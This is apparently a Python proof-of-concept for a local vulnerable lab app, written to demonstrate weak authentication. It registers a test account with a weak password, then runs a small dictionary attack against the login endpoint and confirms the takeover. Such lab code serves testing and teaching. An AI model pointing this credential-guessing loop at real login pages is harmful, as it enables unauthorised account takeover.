from time import perf_counter
from uuid import uuid4

import requests

BASE_URL = "http://127.0.0.1:5000"
TIMEOUT = 5

CANDIDATE_PASSWORDS = (
    "admin",
    "password",
    "qwerty",
    "letmein",
)

def send(session, method, path, **kwargs):
    response = session.request(method, f"{BASE_URL}{path}", timeout=TIMEOUT, **kwargs,)
    if response.status_code == 429:
        raise RuntimeError("Login attempts were rate limited")

    response.raise_for_status()
    return response

def create_victim(username):
    with requests.Session() as victim:
        registration = send(victim,
            "POST", "/auth/register",
            data={
                "username": username,
                "password": "letmein",
            }, allow_redirects=False,
        )

        if registration.status_code != 302:
            raise RuntimeError(
                "Vulnerable registration did not accept the weak password"
            )

        location = registration.headers.get("Location", "")

        if not location.endswith("/auth/login"):
            raise RuntimeError(
                "Registration did not redirect to the login page"
            )

def main():
    suffix = uuid4().hex[:8]
    victim_username = f"victim_auth_{suffix}"
    health = requests.get(f"{BASE_URL}/health", timeout=TIMEOUT)
    health.raise_for_status()

    print("[+] VulnLab health check passed")

    create_victim(victim_username)

    print(f"[+] Created fictional victim: {victim_username}")
    print("[+] Beginning local dictionary attack")

    guessed_password = None
    attempts_used = 0
    started = perf_counter()

    with requests.Session() as attacker:
        for number, candidate in enumerate(
            CANDIDATE_PASSWORDS,
            start=1,
        ):
            attempts_used = number

            response = send(attacker,
                "POST", "/auth/login",
                data={
                    "username": victim_username,
                    "password": candidate,
                }, allow_redirects=False,
            )

            if response.status_code == 302:
                guessed_password = candidate
                print(
                    f"    Attempt {number}: "
                    f"{candidate!r} -> authenticated"
                )
                break

            print(
                f"    Attempt {number}: "
                f"{candidate!r} -> rejected"
            )

        if guessed_password is None:
            raise RuntimeError(
                "Dictionary attack did not authenticate"
            )

        authenticated_page = send(attacker,
            "GET", "/",
        )

        if victim_username not in authenticated_page.text:
            raise RuntimeError(
                "Successful authentication could not be verified"
            )

    elapsed = perf_counter() - started

    print("[+] Weak authentication confirmed")
    print(f"    Guessed password: {guessed_password}")
    print(f"    Attempts required: {attempts_used}")
    print(f"    Elapsed time: {elapsed:.3f} seconds")

    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except requests.RequestException as error:
        print(f"[-] HTTP request failed: {error}")
        raise SystemExit(1)
    except RuntimeError as error:
        print(f"[-] PoC failed: {error}")
        raise SystemExit(1)